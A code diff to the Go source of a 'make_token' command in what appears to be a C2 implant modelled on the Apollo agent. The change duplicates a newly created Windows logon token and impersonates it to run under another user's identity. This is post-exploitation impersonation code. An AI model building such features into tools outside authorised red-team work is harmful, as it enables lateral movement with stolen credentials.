@@ -81,15 +81,10 @@ func (c *MakeTokenCommand) Execute(task structs.Task) structs.CommandResult {
 			if err == nil {
 				currentUsername, currentDomain, _, err := currentUser.User.Sid.LookupAccount("")
 				if err == nil {
-					output = fmt.Sprintf("[*] Current token: %s\\%s\n", currentDomain, currentUsername)
+					output = fmt.Sprintf("Old identity: %s\\%s\n", currentDomain, currentUsername)
 				}
 			}
 		}
-	}
-	
-	// If we couldn't get current token info, just continue without it
-	if output == "" {
-		output = "[*] Creating new token...\n"
 	}
 
 	// Convert strings to UTF-16
@@ -139,12 +134,32 @@ func (c *MakeTokenCommand) Execute(task structs.Task) structs.CommandResult {
 		}
 	}
 
-	output += fmt.Sprintf("[+] Successfully created token for %s\\%s\n", params.Domain, params.Username)
-
-	// Impersonate the new token
-	ret, _, err = procImpersonateLoggedOnUser.Call(uintptr(newTokenHandle))
-	if ret == 0 {
+	// Duplicate the token as an impersonation token (like Apollo does)
+	var hDupToken windows.Token
+	err = windows.DuplicateTokenEx(
+		windows.Token(newTokenHandle),
+		windows.TOKEN_ALL_ACCESS,
+		nil,
+		windows.SecurityImpersonation,
+		windows.TokenImpersonation,
+		&hDupToken,
+	)
+	if err != nil {
 		windows.CloseHandle(newTokenHandle)
+		return structs.CommandResult{
+			Output:    output + fmt.Sprintf("DuplicateTokenEx failed: %v", err),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+	
+	// Close the original token, keep the duplicate
+	windows.CloseHandle(newTokenHandle)
+	
+	// Impersonate the duplicated token
+	ret, _, err = procImpersonateLoggedOnUser.Call(uintptr(hDupToken))
+	if ret == 0 {
+		hDupToken.Close()
 		return structs.CommandResult{
 			Output:    output + fmt.Sprintf("ImpersonateLoggedOnUser failed: %v", err),
 			Status:    "error",
@@ -152,10 +167,8 @@ func (c *MakeTokenCommand) Execute(task structs.Task) structs.CommandResult {
 		}
 	}
 
-	// Don't close the handle - it needs to stay open for the impersonation to remain valid
-	// defer windows.CloseHandle(newTokenHandle) // REMOVED
-
-	output += "[+] Successfully impersonated token!\n"
+	// Don't close the duplicate handle - it needs to stay open for impersonation to remain valid
+	// The token will be closed when rev2self is called or process exits
 
 	// Verify impersonation by checking thread token
 	var hThreadToken windows.Token
@@ -166,14 +179,12 @@ func (c *MakeTokenCommand) Execute(task structs.Task) structs.CommandResult {
 		if err == nil {
 			currentUsername, currentDomain, _, err := threadTokenUser.User.Sid.LookupAccount("")
 			if err == nil {
-				output += fmt.Sprintf("[+] Current context: %s\\%s\n", currentDomain, currentUsername)
+				output += fmt.Sprintf("Successfully impersonated %s\\%s", currentDomain, currentUsername)
 			}
 		}
 	} else {
-		output += "[!] Warning: Could not verify impersonation\n"
+		output += "Warning: Could not verify impersonation"
 	}
-
-	output += "[*] Use 'rev2self' to revert to original token"
 
 	return structs.CommandResult{
 		Output:    strings.TrimSpace(output),
